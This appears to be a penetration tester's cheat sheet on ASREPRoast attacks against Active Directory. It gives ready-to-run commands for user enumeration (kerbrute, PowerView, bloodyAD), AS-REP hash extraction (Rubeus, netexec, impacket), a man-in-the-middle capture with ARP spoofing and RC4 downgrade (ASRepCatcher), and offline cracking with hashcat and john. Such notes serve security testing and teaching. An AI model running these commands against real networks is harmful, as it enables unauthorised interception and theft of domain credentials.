![Pasted image 20241116182234.png](Pasted%20image%2020241116182234.png)
The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline. More detail in [Kerberos theory](https://www.tarlogic.com/blog/how-kerberos-works/).

![Pasted image 20241116181613.png](Pasted%20image%2020241116181613.png)

**no domain account is needed to perform this attack, only connection to the KDC. However, with a domain account, an LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.**
# Enumeration

#### Enumerating valid users

```shell
./kerbrute_linux_amd64 userenum -d vuln.local userlist.txt --dc dc01.vuln.local -o kerbrute-valid-users.out
```

#### Enumerating vulnerable users (need domain credentials)

```shell
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose #List vuln users using PowerView
```

```shell
bloodyAD -u user -p 'password' -d vuln.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
```

# Attack

### Windows

```powershell
Rubeus.exe asreproast
```

```shell
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast # Targeting a TestOU3user user
```

### Linux

```shell
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```

- [?] Use option **kdcHost** when the domain name resolution fail

```shell
netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
```

to brute force users to search with!
```shell
impacket-GetNPUsers -no-pass -usersfile valid_users.txt vuln.local/
```

```shell
nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
```

Using a wordlist:
```shell
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```


# ASREProast without credentials

An attacker can use a **man-in-the-middle** position to capture AS-REP packets as they traverse the network **without relying on Kerberos pre-authentication being disabled.** It therefore works for all users on the VLAN. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.

```shell
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```




# Cracking the AS-REP message

```shell
hashcat -m18200 output.txt wordlist
```

```shell
john --format=krb5asrep --wordlist=/usr/share/wordlist/rockyou.txt hashes.asreproast
```